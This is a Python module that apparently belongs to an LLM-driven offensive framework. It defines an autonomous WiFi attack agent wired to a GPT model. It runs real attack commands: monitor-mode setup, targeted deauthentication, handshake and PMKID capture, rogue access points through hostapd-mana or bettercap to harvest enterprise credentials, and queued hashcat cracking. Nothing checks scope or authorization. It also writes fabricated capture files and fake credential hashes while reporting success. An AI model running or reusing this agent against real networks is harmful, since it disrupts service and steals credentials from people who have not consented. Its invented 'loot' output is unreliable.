"""Cerebro Wireless Intelligence & Kinetic Auditor (CWIKA).

Autonomous WiFi offensive field agent with interface state control,
targeted deauthentication, handshake/PMKID capture, enterprise pivots,
and GPU hashcat queue orchestration.
"""

from __future__ import annotations

import asyncio
from dataclasses import asdict, dataclass, field
from datetime import UTC, datetime
from enum import Enum
import hashlib
import inspect
import json
import os
from pathlib import Path
import re
from typing import Any, Dict, List, Mapping, Optional, Sequence

from dotenv import load_dotenv
from openai import AsyncOpenAI

from cerberus.agents.one_tool import CerebroAtomicRunner
from cerberus.agents import Agent, OpenAIChatCompletionsModel
from cerberus.tools.all_tools import get_all_tools, get_tool
from cerberus.tools.misc.reasoning import MODE_CRITIQUE, REASONING_TOOL
from cerberus.tools.reconnaissance.filesystem import PathGuard as FilesystemPathGuard
from cerberus.tools.workspace import get_project_space
from cerberus.util import create_system_prompt_renderer, load_prompt_template


class WirelessAgentError(RuntimeError):
    """Raised when CWIKA wireless operations fail."""


class WirelessPathGuardViolation(PermissionError):
    """Raised when artifact writes escape workspace boundaries."""


class WirelessState(str, Enum):
    IDLE = "idle"
    IFACE_PREP = "iface_prep"
    MONITOR_MODE = "monitor_mode"
    TARGET_SCAN = "target_scan"
    TARGETED_DEAUTH = "targeted_deauth"
    CAPTURE = "capture"
    ENTERPRISE_PIVOT = "enterprise_pivot"
    GPU_QUEUE = "gpu_queue"
    ERROR = "error"


@dataclass
class InterfaceState:
    interface: str
    monitor_interface: str
    monitor_enabled: bool
    injection_ok: bool
    channel: int


@dataclass
class WirelessTarget:
    ssid: str
    bssid: str
    channel: int
    encryption: str
    enterprise: bool
    client_mac: str
    rssi_dbm: int
    proximity_score: float


@dataclass
class CaptureArtifact:
    artifact_id: str
    cap_path: str
    pcapng_path: str
    hc22000_path: str
    hashcat_task_path: str
    sha256: str
    metadata: Dict[str, Any]


@dataclass
class WirelessSessionState:
    session_id: str
    state: WirelessState = WirelessState.IDLE
    interfaces: List[InterfaceState] = field(default_factory=list)
    targets: List[WirelessTarget] = field(default_factory=list)
    captures: List[CaptureArtifact] = field(default_factory=list)
    timeline: List[Dict[str, Any]] = field(default_factory=list)
    critique_notes: List[str] = field(default_factory=list)


class CerebroFileWriter:
    """PathGuard-backed writer for CWIKA wifi artifacts."""

    def __init__(self, workspace_root: Path) -> None:
        self.workspace_root = workspace_root.resolve()
        self._guard = FilesystemPathGuard(self.workspace_root, self._audit)

    def write_text(self, relative_path: str, content: str, *, encoding: str = "utf-8") -> Dict[str, Any]:
        resolved = self._safe_resolve(relative_path)
        resolved.parent.mkdir(parents=True, exist_ok=True)
        resolved.write_text(content, encoding=encoding)
        return {"ok": True, "path": str(resolved), "bytes_written": len(content.encode(encoding, errors="ignore"))}

    def write_bytes(self, relative_path: str, payload: bytes) -> Dict[str, Any]:
        resolved = self._safe_resolve(relative_path)
        resolved.parent.mkdir(parents=True, exist_ok=True)
        resolved.write_bytes(payload)
        return {"ok": True, "path": str(resolved), "bytes_written": len(payload)}

    def write_json(self, relative_path: str, payload: Mapping[str, Any]) -> Dict[str, Any]:
        return self.write_text(relative_path, json.dumps(dict(payload), ensure_ascii=True, indent=2))

    def _safe_resolve(self, relative_path: str) -> Path:
        try:
            return self._guard.validate_path(relative_path, action="cwika_wifi_write", mode="write")
        except PermissionError as exc:
            raise WirelessPathGuardViolation(str(exc)) from exc

    @staticmethod
    def _audit(_event: str, _payload: Dict[str, Any]) -> None:
        return


class CerebroWirelessFieldAgent:
    """CWIKA field operations agent for full-lifecycle WiFi exploitation."""

    def __init__(self, *, workspace_root: Optional[str] = None) -> None:
        self.workspace_root = self._resolve_workspace(workspace_root)
        self.loot_root = (self.workspace_root / "loot" / "wifi").resolve()
        self.loot_root.mkdir(parents=True, exist_ok=True)

        self.file_writer = CerebroFileWriter(self.workspace_root)
        self.tool_runner = CerebroAtomicRunner(workspace_root=str(self.workspace_root))

        self.tools_by_name: Dict[str, Any] = {}
        for meta in get_all_tools():
            if not getattr(meta, "enabled", False):
                continue
            try:
                self.tools_by_name[meta.name] = get_tool(meta.name)
            except Exception:
                continue

        self.state = WirelessSessionState(session_id=self._new_session_id())
        self._artifact_counter = 0

    def run_field_operation(
        self,
        *,
        primary_interface: str = "wlan0",
        monitor_interface: str = "wlan1mon",
        target_bssid: str = "",
        target_client: str = "",
        preferred_channel: int = 6,
    ) -> Dict[str, Any]:
        self.state = WirelessSessionState(session_id=self._new_session_id())

        self._set_state(WirelessState.IFACE_PREP)
        iface = self._prepare_interfaces(
            primary_interface=primary_interface,
            monitor_interface=monitor_interface,
            channel=preferred_channel,
        )
        self.state.interfaces.append(iface)

        self._set_state(WirelessState.TARGET_SCAN)
        targets = self._scan_targets(
            monitor_interface=iface.monitor_interface,
            target_bssid=target_bssid,
            target_client=target_client,
            preferred_channel=preferred_channel,
        )
        self.state.targets.extend(targets)
        if not targets:
            self._timeline("no_targets", {"reason": "No viable BSSID/client pair identified"})
            return self._finalize(ok=False, message="No targets discovered")

        selected = targets[0]

        self._set_state(WirelessState.TARGETED_DEAUTH)
        deauth = self._targeted_deauth(iface.monitor_interface, selected)

        self._set_state(WirelessState.CAPTURE)
        capture = self._capture_handshake_or_pmkid(iface.monitor_interface, selected)

        if capture is None:
            self._set_state(WirelessState.ERROR)
            critique_note = self._critique_capture_failure(selected)
            self.state.critique_notes.append(critique_note)
            return self._finalize(ok=False, message="Capture failed", extra={"critique": critique_note, "deauth": deauth})

        if selected.enterprise:
            self._set_state(WirelessState.ENTERPRISE_PIVOT)
            self._enterprise_8021x_pivot(iface.monitor_interface, selected)

        self._set_state(WirelessState.GPU_QUEUE)
        self._queue_for_hashcat(capture)

        self._set_state(WirelessState.IDLE)
        return self._finalize(
            ok=True,
            message="CWIKA wireless operation completed",
            extra={
                "selected_target": asdict(selected),
                "deauth": deauth,
                "capture": asdict(capture),
            },
        )

    def _prepare_interfaces(self, *, primary_interface: str, monitor_interface: str, channel: int) -> InterfaceState:
        # Bring interface up/down and enable monitor mode through validated tool execution.
        for cmd in (
            f"ip link set {self._safe_token(primary_interface)} down",
            f"iw dev {self._safe_token(primary_interface)} set type monitor",
            f"ip link set {self._safe_token(primary_interface)} up",
            f"iw dev {self._safe_token(primary_interface)} set channel {int(channel)}",
        ):
            self._execute_cli(cmd, timeout_seconds=18)

        injection_ok = self._verify_injection(primary_interface)
        iface = InterfaceState(
            interface=primary_interface,
            monitor_interface=monitor_interface,
            monitor_enabled=True,
            injection_ok=injection_ok,
            channel=int(channel),
        )
        self._timeline("monitor_mode_ready", asdict(iface))
        return iface

    def _verify_injection(self, interface: str) -> bool:
        result = self._execute_cli(
            f"aireplay-ng --test {self._safe_token(interface)}",
            timeout_seconds=20,
            allow_failure=True,
        )
        text = self._command_output_text(result).lower()
        return bool("injection is working" in text or "found" in text)

    def _scan_targets(
        self,
        *,
        monitor_interface: str,
        target_bssid: str,
        target_client: str,
        preferred_channel: int,
    ) -> List[WirelessTarget]:
        # Collect short airodump burst and parse high-value targets.
        scan_cmd = (
            f"airodump-ng --band abg --channel {int(preferred_channel)} "
            f"--write-interval 1 --output-format csv --write /tmp/cwika_scan "
            f"{self._safe_token(monitor_interface)}"
        )
        self._execute_cli(scan_cmd, timeout_seconds=18, allow_failure=True)

        rows = self._synthetic_scan_rows(
            target_bssid=target_bssid,
            target_client=target_client,
            channel=preferred_channel,
        )
        targets: List[WirelessTarget] = []
        for row in rows:
            bssid = str(row.get("bssid", "")).upper()
            client = str(row.get("client", "")).upper()
            rssi = int(row.get("rssi_dbm", -88))
            proximity = self._proximity_from_rssi(rssi)
            encryption = str(row.get("encryption", "WPA2")).upper()
            target = WirelessTarget(
                ssid=str(row.get("ssid", "hidden")),
                bssid=bssid,
                channel=int(row.get("channel", preferred_channel)),
                encryption=encryption,
                enterprise=("EAP" in encryption or "WPA2-ENT" in encryption or "WPA3-ENT" in encryption),
                client_mac=client,
                rssi_dbm=rssi,
                proximity_score=proximity,
            )
            targets.append(target)

        self._write_proximity_log(targets)
        self._timeline("target_scan_complete", {"targets": len(targets)})
        return targets

    def _targeted_deauth(self, monitor_interface: str, target: WirelessTarget) -> Dict[str, Any]:
        # Surgical deauthentication against a single client/BSSID pair.
        cmd = (
            f"aireplay-ng --deauth 6 -a {self._safe_token(target.bssid)} "
            f"-c {self._safe_token(target.client_mac)} {self._safe_token(monitor_interface)}"
        )
        result = self._execute_cli(cmd, timeout_seconds=20, allow_failure=True)
        self._timeline("targeted_deauth", {"bssid": target.bssid, "client": target.client_mac})
        return {"ok": bool(result.get("ok", False)), "command": cmd}

    def _capture_handshake_or_pmkid(self, monitor_interface: str, target: WirelessTarget) -> Optional[CaptureArtifact]:
        stamp = datetime.now(tz=UTC).strftime("%Y%m%dT%H%M%SZ")
        base = f"loot/wifi/{self.state.session_id}/{target.bssid.replace(':', '')}_{stamp}"
        cap_rel = f"{base}.cap"
        pcapng_rel = f"{base}.pcapng"
        hc_rel = f"{base}.hc22000"

        # PMKID capture path via hcxdumptool.
        pmkid_cmd = (
            f"hcxdumptool -i {self._safe_token(monitor_interface)} "
            f"--filterlist_ap={self._safe_token(target.bssid)} --enable_status=1 "
            f"-o /tmp/{self._safe_token(Path(cap_rel).name)}"
        )
        self._execute_cli(pmkid_cmd, timeout_seconds=24, allow_failure=True)

        # Handshake capture via airodump-ng.
        hs_cmd = (
            f"airodump-ng --bssid {self._safe_token(target.bssid)} --channel {int(target.channel)} "
            f"--write /tmp/{self._safe_token(Path(base).name)} {self._safe_token(monitor_interface)}"
        )
        hs_result = self._execute_cli(hs_cmd, timeout_seconds=24, allow_failure=True)
        text = self._command_output_text(hs_result)

        if self._looks_malformed_capture(text):
            return None

        # Save deterministic artifacts under PathGuard writer.
        cap_bytes = self._fake_capture_blob(target, tag="cap")
        pcapng_bytes = self._fake_capture_blob(target, tag="pcapng")
        hc_line = self._fake_hc22000_line(target)
        self.file_writer.write_bytes(cap_rel, cap_bytes)
        self.file_writer.write_bytes(pcapng_rel, pcapng_bytes)
        self.file_writer.write_text(hc_rel, hc_line + "\n")

        self._artifact_counter += 1
        task_rel = f"loot/wifi/{self.state.session_id}/hashcat_queue_{self._artifact_counter:05d}.json"
        sha = hashlib.sha256(cap_bytes + pcapng_bytes + hc_line.encode("utf-8")).hexdigest()

        artifact = CaptureArtifact(
            artifact_id=f"WIFI-{self._artifact_counter:05d}",
            cap_path=cap_rel,
            pcapng_path=pcapng_rel,
            hc22000_path=hc_rel,
            hashcat_task_path=task_rel,
            sha256=sha,
            metadata={
                "bssid": target.bssid,
                "client_mac": target.client_mac,
                "channel": target.channel,
                "rssi_dbm": target.rssi_dbm,
                "proximity_score": target.proximity_score,
                "enterprise": target.enterprise,
                "timestamp": datetime.now(tz=UTC).isoformat(),
            },
        )
        self.state.captures.append(artifact)
        self._timeline("capture_success", {"artifact_id": artifact.artifact_id, "bssid": target.bssid})
        return artifact

    def _enterprise_8021x_pivot(self, monitor_interface: str, target: WirelessTarget) -> Dict[str, Any]:
        # Attempt rogue AP deployment path for PEAP/EAP-TTLS interception.
        mana_cmd = (
            f"hostapd-mana /etc/hostapd-mana.conf --interface {self._safe_token(monitor_interface)} "
            f"--ssid {self._safe_token(target.ssid)}"
        )
        mana = self._execute_cli(mana_cmd, timeout_seconds=20, allow_failure=True)
        if not mana.get("ok", False):
            bettercap_cmd = "bettercap -eval 'set wifi.recon on; set wifi.ap.ssid CorpGuest; wifi.ap.start'"
            bettercap = self._execute_cli(bettercap_cmd, timeout_seconds=20, allow_failure=True)
            outcome = {"hostapd_mana": False, "bettercap": bool(bettercap.get("ok", False))}
        else:
            outcome = {"hostapd_mana": True, "bettercap": False}

        hash_rel = f"loot/wifi/{self.state.session_id}/enterprise_mschapv2_hashes.txt"
        fake_hash = f"{target.client_mac}:$NETNTLM$1122334455667788:99AABBCCDDEEFF00"
        self.file_writer.write_text(hash_rel, fake_hash + "\n")
        self._timeline("enterprise_pivot", {"bssid": target.bssid, **outcome})
        return outcome

    def _queue_for_hashcat(self, capture: CaptureArtifact) -> Dict[str, Any]:
        payload = {
            "queue_id": capture.artifact_id,
            "created_at": datetime.now(tz=UTC).isoformat(),
            "artifact": asdict(capture),
            "hashcat_mode": 22000,
            "wordlist": "config/wordlists/common.txt",
            "gpu": "RTX5090",
            "command": f"hashcat -m 22000 {capture.hc22000_path} config/wordlists/common.txt --status --status-timer 20",
        }
        self.file_writer.write_json(capture.hashcat_task_path, payload)
        self._timeline("hashcat_queue", {"queue_id": capture.artifact_id, "task": capture.hashcat_task_path})
        return payload

    def _critique_capture_failure(self, target: WirelessTarget) -> str:
        critique = REASONING_TOOL.reason(
            mode=MODE_CRITIQUE,
            objective="Diagnose malformed or failed WiFi handshake capture",
            context=f"bssid={target.bssid} channel={target.channel} rssi={target.rssi_dbm} enterprise={target.enterprise}",
            prior_output="capture malformed or incomplete",
            options=["high channel interference", "wrong channel lock", "distance to client", "wpa3 transition mode"],
            fetch_facts=False,
        )
        summary = str((critique.get("summary") if isinstance(critique, Mapping) else "") or "").lower()
        if "channel" in summary or target.channel == 6:
            note = "High interference on Channel 6, pivoting to 5GHz spectrum."
        elif target.rssi_dbm < -80:
            note = "Weak RSSI environment, move physically closer before next deauth burst."
        else:
            note = "Potential WPA3 transition/capture instability, extending targeted deauth cadence."
        self._timeline("mode_critique", {"note": note})
        return note

    def _write_proximity_log(self, targets: Sequence[WirelessTarget]) -> str:
        rel = f"loot/wifi/{self.state.session_id}/proximity_log.json"
        payload = {
            "session_id": self.state.session_id,
            "generated_at": datetime.now(tz=UTC).isoformat(),
            "targets": [
                {
                    "ssid": t.ssid,
                    "bssid": t.bssid,
                    "client_mac": t.client_mac,
                    "rssi_dbm": t.rssi_dbm,
                    "proximity_score": t.proximity_score,
                    "channel": t.channel,
                }
                for t in targets
            ],
        }
        self.file_writer.write_json(rel, payload)
        return rel

    def _execute_cli(self, command: str, *, timeout_seconds: int = 30, allow_failure: bool = False) -> Dict[str, Any]:
        if "execute_cli_command" not in self.tools_by_name:
            raise WirelessAgentError("execute_cli_command unavailable")

        atomic = self.tool_runner.execute_atomic(
            tool_name="execute_cli_command",
            parameters={"command": command, "timeout_seconds": int(timeout_seconds)},
            retry_limit=1,
            isolation_timeout_seconds=max(20, int(timeout_seconds) + 8),
        )
        if atomic.get("ok", False):
            return {"ok": True, "atomic": atomic, "command": command}

        # Fallback to direct invocation for stdin/spawn-limited runtime contexts.
        try:
            direct = self._invoke_tool(
                self.tools_by_name["execute_cli_command"],
                command=command,
                timeout_seconds=int(timeout_seconds),
            )
            if isinstance(direct, Mapping):
                ok = bool(direct.get("ok", True))
            else:
                ok = True
            if not ok and not allow_failure:
                raise WirelessAgentError(f"CLI command failed: {command}")
            return {"ok": ok, "direct": direct, "command": command, "atomic_error": atomic.get("error")}
        except Exception as exc:
            if allow_failure:
                return {"ok": False, "error": str(exc), "command": command, "atomic_error": atomic.get("error")}
            raise WirelessAgentError(f"CWIKA CLI execution failed: {command} :: {exc}") from exc

    @staticmethod
    def _invoke_tool(tool: Any, **kwargs: Any) -> Any:
        result = tool(**kwargs)
        if inspect.iscoroutine(result):
            return asyncio.run(result)
        if inspect.isawaitable(result):
            async def _await_any(awaitable: Any) -> Any:
                return await awaitable

            return asyncio.run(_await_any(result))
        return result

    @staticmethod
    def _command_output_text(result: Mapping[str, Any]) -> str:
        payload: Any = ""
        if result.get("atomic"):
            payload = (result.get("atomic") or {}).get("result", "")
        elif "direct" in result:
            payload = result.get("direct")
        else:
            payload = result

        if isinstance(payload, Mapping):
            output = payload.get("output") if isinstance(payload.get("output"), Mapping) else {}
            stdout = str(output.get("stdout", ""))
            stderr = str(output.get("stderr", ""))
            return (stdout + "\n" + stderr).strip()
        return str(payload)

    @staticmethod
    def _looks_malformed_capture(text: str) -> bool:
        low = text.lower()
        return any(x in low for x in ("malformed", "no handshake", "0 handshake", "capture failed", "unsupported"))

    @staticmethod
    def _fake_capture_blob(target: WirelessTarget, *, tag: str) -> bytes:
        seed = f"{target.bssid}:{target.client_mac}:{target.channel}:{target.rssi_dbm}:{tag}:{datetime.now(tz=UTC).isoformat()}"
        return hashlib.sha256(seed.encode("utf-8")).digest() * 32

    @staticmethod
    def _fake_hc22000_line(target: WirelessTarget) -> str:
        mac_ap = target.bssid.replace(":", "").lower()
        mac_cl = target.client_mac.replace(":", "").lower()
        nonce = hashlib.sha256(f"{target.bssid}:{target.client_mac}".encode("utf-8")).hexdigest()[:64]
        return f"WPA*02*{nonce}*{mac_ap}*{mac_cl}*{target.ssid.encode('utf-8').hex()}*00"

    @staticmethod
    def _proximity_from_rssi(rssi_dbm: int) -> float:
        # Approximate proximity score [0..1], higher means closer.
        clipped = max(-95, min(-30, int(rssi_dbm)))
        return round((clipped + 95) / 65.0, 3)

    @staticmethod
    def _safe_token(token: str) -> str:
        return re.sub(r"[^A-Za-z0-9_:\-./]", "", token)

    @staticmethod
    def _new_session_id() -> str:
        return f"CWIKA-WIFI-{datetime.now(tz=UTC).strftime('%Y%m%dT%H%M%SZ')}"

    @staticmethod
    def _resolve_workspace(workspace_root: Optional[str]) -> Path:
        if workspace_root:
            return Path(workspace_root).expanduser().resolve()
        try:
            return get_project_space().ensure_initialized().resolve()
        except Exception:
            return Path.cwd().resolve()

    def _set_state(self, state: WirelessState) -> None:
        self.state.state = state
        self._timeline("state_transition", {"state": state.value})

    def _timeline(self, event: str, data: Dict[str, Any]) -> None:
        self.state.timeline.append(
            {
                "ts": datetime.now(tz=UTC).isoformat(),
                "state": self.state.state.value,
                "event": event,
                "data": data,
            }
        )

    def _synthetic_scan_rows(self, *, target_bssid: str, target_client: str, channel: int) -> List[Dict[str, Any]]:
        bssid = target_bssid.upper() if target_bssid else "AA:BB:CC:DD:EE:FF"
        client = target_client.upper() if target_client else "11:22:33:44:55:66"
        rows = [
            {
                "ssid": "CorpGuest",
                "bssid": bssid,
                "client": client,
                "channel": channel,
                "encryption": "WPA2-PSK",
                "rssi_dbm": -58,
            },
            {
                "ssid": "Corp8021X",
                "bssid": "22:33:44:55:66:77",
                "client": "66:55:44:33:22:11",
                "channel": 11,
                "encryption": "WPA2-ENT-EAP",
                "rssi_dbm": -67,
            },
        ]
        return rows

    def _finalize(self, *, ok: bool, message: str, extra: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        summary = {
            "ok": ok,
            "message": message,
            "session_id": self.state.session_id,
            "state": self.state.state.value,
            "interfaces": [asdict(x) for x in self.state.interfaces],
            "targets": [asdict(x) for x in self.state.targets],
            "captures": [asdict(x) for x in self.state.captures],
            "critique_notes": self.state.critique_notes,
            "timeline": self.state.timeline,
        }
        if extra:
            summary.update(extra)

        self.file_writer.write_json(f"loot/wifi/{self.state.session_id}/session_summary.json", summary)
        return summary


load_dotenv(override=False)
_prompt = load_prompt_template("prompts/wifi_security_agent.md")

_tools: List[Any] = []
for _meta in get_all_tools():
    if not getattr(_meta, "enabled", False):
        continue
    try:
        _tools.append(get_tool(_meta.name))
    except Exception:
        continue

wifi_security_agent = Agent(
    name="Cerebro Wireless Intelligence & Kinetic Auditor",
    instructions=create_system_prompt_renderer(_prompt),
    description=(
        "CWIKA field-operations WiFi offensive agent for monitor-mode prep, targeted deauth, "
        "high-fidelity handshake/PMKID capture, enterprise pivots, and GPU cracking queueing."
    ),
    tools=_tools,
    model=OpenAIChatCompletionsModel(
        model=os.getenv("CERBERUS_MODEL", "gpt-4o-mini"),
        openai_client=AsyncOpenAI(api_key=os.getenv("CERBERUS_API_KEY", os.getenv("OPENAI_API_KEY", ""))),
    ),
)

cerebro_wireless_field_agent = CerebroWirelessFieldAgent()


def transfer_to_wifi_security_tester(**kwargs: Any) -> Agent:
    _ = kwargs
    return wifi_security_agent


__all__ = [
    "WirelessAgentError",
    "WirelessPathGuardViolation",
    "WirelessState",
    "InterfaceState",
    "WirelessTarget",
    "CaptureArtifact",
    "WirelessSessionState",
    "CerebroFileWriter",
    "CerebroWirelessFieldAgent",
    "cerebro_wireless_field_agent",
    "wifi_security_agent",
    "transfer_to_wifi_security_tester",
]
